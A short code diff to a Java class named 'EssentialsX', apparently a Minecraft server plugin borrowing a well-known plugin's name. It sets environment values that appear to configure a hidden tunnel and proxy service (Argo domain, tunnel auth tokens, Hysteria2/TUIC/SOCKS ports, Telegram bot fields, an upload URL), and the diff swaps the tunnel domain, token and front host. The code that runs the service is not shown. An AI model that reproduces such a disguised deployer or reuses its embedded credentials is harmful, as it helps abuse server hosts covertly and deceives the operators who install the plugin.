@@ -76,8 +76,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
         env.put("FILE_PATH", "./world");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "aida.zdsas.cyou");
-        env.put("ARGO_AUTH", "eyJhIjoiMmY2ZTllNjhmNDk2NTBjMGFjMzQ3OTkzMDE0NDRkNGQiLCJ0IjoiN2QwYTdkNDQtNzU2Ni00ZWIwLWJhYTctMTAxYWRhZTk1ZjllIiwicyI6Ik1qa3dOR015WlRJdE1UQTNNaTAwTm1SbExXSmhNVEF0TldVeE1HSmlNekF6WkRJeSJ9");
+        env.put("ARGO_DOMAIN", "pingless.zdsas.cyou");
+        env.put("ARGO_AUTH", "eyJhIjoiMmY2ZTllNjhmNDk2NTBjMGFjMzQ3OTkzMDE0NDRkNGQiLCJ0IjoiN2QwYTdkNDQtNzU2Ni00ZWIwLWJhYTctMTAxYWRhZTk1ZjllIiwicyI6IllqWmpZV0UzWkRndFpHSmhNeTAwWldOaUxXSTJabVV0T0RReE5URmpabVEzTWpVMCJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
@@ -87,7 +87,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
         env.put("BOT_TOKEN", "");
-        env.put("CFIP", "spring.io");
+        env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
         env.put("NAME", "");
         env.put("DISABLE_ARGO", "false");
